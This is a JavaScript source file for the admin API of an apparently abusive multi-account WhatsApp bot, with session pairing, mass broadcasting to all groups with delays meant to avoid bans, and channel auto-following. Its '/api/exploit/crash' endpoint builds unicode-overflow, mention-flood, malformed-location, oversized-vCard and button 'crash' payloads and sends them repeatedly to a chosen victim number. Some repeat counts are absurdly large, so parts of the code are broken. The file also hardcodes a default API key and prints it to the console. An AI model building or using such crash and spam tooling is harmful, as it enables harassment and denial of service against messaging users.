const express = require('express');
const cors = require('cors');
const path = require('path');
const { sessions, terminateSession, requestPairingCode, pairingCodesStore, sessionStates, followChannel, resolveChannelJid } = require('./baileys-helper');
const fs = require('fs');
require('dotenv').config();

const SETTINGS_FILE = path.join(__dirname, '../admin_settings.json');
global.adminSettings = { autoReactToChannels: false, persistentChannels: [], targetReactChannels: [] };
if (fs.existsSync(SETTINGS_FILE)) {
    try {
        const saved = JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8'));
        global.adminSettings = { ...global.adminSettings, ...saved };
    } catch (e) { }
}
function saveAdminSettings() {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(global.adminSettings, null, 2));
}

function startAdminApi() {
    const app = express();
    const port = process.env.ADMIN_PORT || 3000;

    // Check for API key in .env, fallback to a default one if not set
    const apiKey = process.env.ADMIN_API_KEY || 'mazari_secret_key';

    app.use(cors());

    // Serve the Admin Dashboard Frontend
    app.use(express.static(path.join(__dirname, '../public')));

    app.use(express.json());

    // Middleware to check API key
    const checkAuth = (req, res, next) => {
        const key = req.headers['x-api-key'] || req.query.apiKey;
        if (key !== apiKey) {
            return res.status(401).json({ error: 'Unauthorized: Invalid API Key' });
        }
        next();
    };

    // Protect all API routes
    app.use('/api', checkAuth);

    // Endpoint 1: Get Bot Status & Detailed Sessions
    app.get('/api/status', (req, res) => {
        const activeSessions = [];
        for (const [phone, sock] of sessions.entries()) {
            activeSessions.push({
                phone: phone,
                status: sessionStates.get(phone) || 'CONNECTED'
            });
        }

        // Include sessions that are connecting or waiting for code
        for (const [phone, state] of sessionStates.entries()) {
            if (state !== 'IDLE' && state !== 'CONNECTED' && !activeSessions.find(s => s.phone === phone)) {
                activeSessions.push({
                    phone: phone,
                    status: state
                });
            }
        }

        res.json({
            status: 'online',
            uptime: process.uptime(),
            memory: process.memoryUsage(),
            activeSessionsCount: activeSessions.filter(s => s.status === 'CONNECTED').length,
            sessions: activeSessions
        });
    });

    // Endpoint 2: Send Message (Broadcast or DM)
    app.post('/api/message', async (req, res) => {
        const { sessionPhone, to, text, type } = req.body;

        if (!text) {
            return res.status(400).json({ error: 'Missing message text' });
        }

        let sock;
        if (sessionPhone) {
            sock = sessions.get(sessionPhone);
        } else {
            sock = sessions.values().next().value;
        }

        if (!sock) {
            return res.status(404).json({ error: 'No active WhatsApp session found to send message' });
        }

        try {
            if (type === 'status') {
                await sock.sendMessage('status@broadcast', { text });
                return res.json({ success: true, message: 'Status updated successfully!' });
            }
            else if (type === 'all_groups') {
                const groupMetadata = await sock.groupFetchAllParticipating();
                const groups = Object.values(groupMetadata);
                let sentCount = 0;
                for (const group of groups) {
                    try {
                        await sock.sendMessage(group.id, { text });
                        sentCount++;
                        await new Promise(resolve => setTimeout(resolve, 2000)); // Delay to prevent ban
                    } catch (e) { }
                }
                return res.json({ success: true, message: `Broadcast sent to ${sentCount} groups!` });
            }
            else {
                if (!to) return res.status(400).json({ error: 'Missing target number/JID' });

                // Try to format JID correctly
                let jid = to;
                if (!jid.includes('@')) {
                    if (jid.length > 15) {
                        jid = `${jid}@newsletter`; // Probably a channel
                    } else {
                        jid = `${jid}@s.whatsapp.net`; // Normal number
                    }
                }

                await sock.sendMessage(jid, { text });
                return res.json({ success: true, message: 'Message sent successfully!' });
            }
        } catch (error) {
            console.error('[ADMIN API ERROR]', error);
            res.status(500).json({ success: false, error: error.message || 'Unknown error' });
        }
    });

    // Endpoint 3: Request Pairing Code (Add Session)
    app.post('/api/session/pair', async (req, res) => {
        const { phone } = req.body;
        if (!phone) return res.status(400).json({ error: 'Phone number required' });
        try {
            pairingCodesStore.delete(phone); // Clear previous code
            await requestPairingCode(phone);
            res.json({ success: true, message: 'Pairing requested. Wait for code.' });
        } catch (error) {
            res.status(500).json({ success: false, error: error.message });
        }
    });

    // Endpoint 4: Get Pairing Code Status
    app.get('/api/session/pair/:phone', (req, res) => {
        const phone = req.params.phone;
        const code = pairingCodesStore.get(phone);
        const state = sessionStates.get(phone) || 'IDLE';
        res.json({ success: true, phone, code, state });
    });

    // Endpoint 5: Disconnect Session
    app.post('/api/session/disconnect', async (req, res) => {
        const { phone } = req.body;
        if (!phone) return res.status(400).json({ error: 'Phone number required' });
        try {
            await terminateSession(phone);
            pairingCodesStore.delete(phone);
            res.json({ success: true, message: 'Session disconnected and deleted.' });
        } catch (error) {
            res.status(500).json({ success: false, error: error.message });
        }
    });

    // Endpoint 6: Auto Follow Channel
    app.post('/api/channel/follow', async (req, res) => {
        const { channelLink } = req.body;
        if (!channelLink) return res.status(400).json({ error: 'Channel link or ID required' });
        try {
            const result = await followChannel(channelLink);

            // Add to persistent list if not already there
            if (result.jid && !global.adminSettings.persistentChannels.includes(result.jid)) {
                global.adminSettings.persistentChannels.push(result.jid);
                saveAdminSettings();
            }

            res.json({
                success: true,
                message: `Successfully followed channel on ${result.successCount} of ${result.totalSessions} active sessions! (Added to persistent list)`,
                data: result
            });
        } catch (error) {
            res.status(500).json({ success: false, error: error.message });
        }
    });

    // Endpoint 7: Get Settings
    app.get('/api/settings', (req, res) => {
        res.json({ success: true, settings: global.adminSettings });
    });

    // Endpoint 8: Update Settings
    app.post('/api/settings', async (req, res) => {
        const { autoReactToChannels, targetReactChannels } = req.body;
        if (typeof autoReactToChannels !== 'undefined') {
            global.adminSettings.autoReactToChannels = autoReactToChannels;
        }

        if (typeof targetReactChannels !== 'undefined') {
            try {
                const parts = targetReactChannels.split(',').map(s => s.trim()).filter(s => s);
                const resolvedJids = [];
                for (const part of parts) {
                    const jid = await resolveChannelJid(part);
                    resolvedJids.push(jid);
                }
                global.adminSettings.targetReactChannels = resolvedJids;
            } catch (err) {
                return res.status(400).json({ success: false, error: err.message });
            }
        }

        saveAdminSettings();
        res.json({ success: true, settings: global.adminSettings });
    });

    // Endpoint 9: Get Analytics
    app.get('/api/analytics', (req, res) => {
        res.json({ success: true, analytics: global.analyticsData });
    });

    // Endpoint 10: Reset Analytics
    app.post('/api/analytics/reset', (req, res) => {
        global.analyticsData = {
            sessions: {},
            totalLikes: 0
        };
        const fs = require('fs');
        const path = require('path');
        fs.writeFileSync(path.join(__dirname, '../analytics.json'), JSON.stringify(global.analyticsData, null, 2));
        res.json({ success: true, message: 'Analytics reset successfully' });
    });

    // Endpoint 6: Get Live Logs
    app.get('/api/logs', (req, res) => {
        res.json({ success: true, logs: global.botLogs || [] });
    });

    // Endpoint 7: Restart Bot
    app.post('/api/restart', (req, res) => {
        res.json({ success: true, message: 'Restarting bot...' });
        setTimeout(() => {
            process.exit(1); // PM2 will auto-restart the process
        }, 1000);
    });

    // Endpoint 11: Send Exploit Payload (Crash)
    app.post('/api/exploit/crash', async (req, res) => {
        const { sessionPhone, target, type } = req.body;

        if (!target) return res.status(400).json({ error: 'Target JID/Number required' });
        if (!type) return res.status(400).json({ error: 'Payload type required' });

        let sock;
        if (sessionPhone) {
            sock = sessions.get(sessionPhone);
        } else {
            sock = sessions.values().next().value;
        }

        if (!sock) return res.status(404).json({ error: 'No active WhatsApp session found' });

        // Format JID
        let jid = target;
        if (!jid.includes('@')) {
            jid = `${jid}@s.whatsapp.net`;
        }

        try {
            console.log(`🚀 [EXPLOIT] Launching ${type} attack on ${jid} from ${sessionPhone || 'default'}`);

            const createPayload = (type) => {
                let payload = {};
                switch (type) {
                    case 'unicode_overflow':
                        // Advanced mix of RTL, LTR, and exotic ZWJ characters
                        const rtl = '\u200E\u200F\u202A\u202B\u202C\u202D\u202E';
                        const zwj = '\u200B\u200C\u200D\uFEFF';
                        const exotic = '҉'.repeat(1000000000000);
                        const base = (rtl + zwj + exotic).repeat(100000000000000);
                        payload = { text: `⚠️ MAZARI SYSTEM FAILURE ⚠️\n${base.repeat(50)}` };
                        break;

                    case 'jid_flood':
                        // Mention flood with 2000+ JIDs and ZWJ to bypass simple filters
                        const mentions = [];
                        for (let i = 0; i < 999999999999999999; i++) {
                            mentions.push(`923${Math.floor(Math.random() * 9)} ${Math.floor(Math.random() * 9999999)}@s.whatsapp.net`);
                        }
                        payload = {
                            text: '☠️ ' + '\u200D'.repeat(9999999999999999999999999999999999999999999) + ' SYSTEM OVERLOAD ' + '\u200D'.repeat(1000) + ' ☠️',
                            mentions: mentions
                        };
                        break;

                    case 'location_crash':
                        // Malformed location with extreme coordinates and massive metadata
                        payload = {
                            location: {
                                degreesLatitude: -999999.99,
                                degreesLongitude: 999999.99,
                                name: '☣️ MAZARI EXPLOIT ☣️'.repeat(99999999999999999999999999999999999999999999999999999),
                                address: 'CRASH_SYSTEM_NOW'.repeat(9999999999999999999999999999999999999999999999999999999999999),
                                jpegThumbnail: Buffer.alloc(10, 0) // Tiny malformed thumb
                            }
                        };
                        break;

                    case 'vcard_crash':
                        // Massive VCard virtex
                        const longVal = '☠️'.repeat(1000);
                        const vcard = 'BEGIN:VCARD\nVERSION:3.0\n' +
                            `FN:${longVal}\n` +
                            `N:;${longVal};;;\n` +
                            `ORG:${longVal}\n` +
                            `TITLE:${longVal}\n` +
                            `ADR:;;${longVal};;;;\n` +
                            `TEL;type=CELL;type=VOICE;waid=923232391033:+92 323 2391033\n` +
                            `NOTE:${longVal.repeat(5)}\n` +
                            'END:VCARD';
                        payload = {
                            contacts: {
                                displayName: '☠️ MAZARI CRASH ☠️',
                                contacts: [{ vcard }, { vcard }, { vcard }]
                            }
                        };
                        break;

                    case 'button_crash':
                        // Sending a buttons message with massive payload (often crashes mobile UI)
                        payload = {
                            text: '☣️ MAZARI BUTTON EXPLOIT ☣️',
                            footer: 'S Y S T E M  E R R O R'.repeat(100),
                            buttons: [
                                { buttonId: 'id1', buttonText: { displayText: 'CRASH'.repeat(500) }, type: 1 },
                                { buttonId: 'id2', buttonText: { displayText: 'FREEZE'.repeat(500) }, type: 1 }
                            ],
                            headerType: 1
                        };
                        break;

                    default:
                        payload = { text: 'Unknown exploit type requested' };
                }
                return payload;
            };

            // Attack Phase: Send multiple payloads with increasing intensity
            const sendAttack = async (p) => {
                await sock.sendMessage(jid, p);
            };

            if (type === 'all_mixed') {
                const types = ['unicode_overflow', 'jid_flood', 'location_crash', 'vcard_crash'];
                for (const t of types) {
                    await sendAttack(createPayload(t));
                    await new Promise(r => setTimeout(r, 1000));
                }
            } else {
                // Send the specific payload multiple times
                const p = createPayload(type);
                for (let i = 0; i < 5; i++) {
                    await sendAttack(p);
                    await new Promise(r => setTimeout(r, 800));
                }
            }

            res.json({ success: true, message: `🚀 ${type} attack launched successfully against ${jid}!` });
        } catch (error) {
            console.error('[EXPLOIT ERROR]', error);
            res.status(500).json({ success: false, error: error.message || 'Unknown error' });
        }
    });

    app.listen(port, () => {
        console.log(`\n🌐 [ADMIN API] Dashboard API is running on port ${port}`);
        console.log(`🔑 [ADMIN API] Your API Key is: ${apiKey}`);
        console.log(`🛡️  Make sure to open port ${port} in your AWS EC2 Security Group!\n`);
    });
}

module.exports = { startAdminApi };
